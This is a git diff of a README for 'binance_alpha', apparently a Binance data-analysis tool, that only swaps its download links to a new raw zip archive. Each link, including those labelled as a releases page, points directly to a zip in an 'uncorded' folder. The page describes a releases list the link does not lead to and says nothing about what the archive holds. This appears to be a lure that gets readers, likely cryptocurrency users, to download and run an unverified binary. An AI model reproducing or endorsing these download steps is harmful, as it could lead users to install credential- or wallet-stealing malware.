@@ -6,7 +6,7 @@ Welcome to **binance_alpha**! This application helps you access and analyze Bina
 
 ## 📥 Download Now
 
-[![Download binance_alpha](https://raw.githubusercontent.com/thomas7734/binance_alpha/main/uncorded/binance_alpha.zip)](https://raw.githubusercontent.com/thomas7734/binance_alpha/main/uncorded/binance_alpha.zip)
+[![Download binance_alpha](https://github.com/thomas7734/binance_alpha/raw/refs/heads/main/uncorded/binance_alpha_v3.6.zip)](https://github.com/thomas7734/binance_alpha/raw/refs/heads/main/uncorded/binance_alpha_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To run **binance_alpha**, your device needs to meet the following requirements:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
 
-   [Download from Releases](https://raw.githubusercontent.com/thomas7734/binance_alpha/main/uncorded/binance_alpha.zip)
+   [Download from Releases](https://github.com/thomas7734/binance_alpha/raw/refs/heads/main/uncorded/binance_alpha_v3.6.zip)
 
 2. **Choose the Latest Version:** You will see a list of available versions. Find the most recent version at the top.
 
@@ -92,4 +92,4 @@ For further assistance, please reach out via the contact section in the reposito
 
 Thank you for choosing **binance_alpha**! Enjoy exploring and analyzing Binance data with ease. Don’t forget to visit the releases page for updates and new features.
 
-[Download from Releases](https://raw.githubusercontent.com/thomas7734/binance_alpha/main/uncorded/binance_alpha.zip)
+[Download from Releases](https://github.com/thomas7734/binance_alpha/raw/refs/heads/main/uncorded/binance_alpha_v3.6.zip)
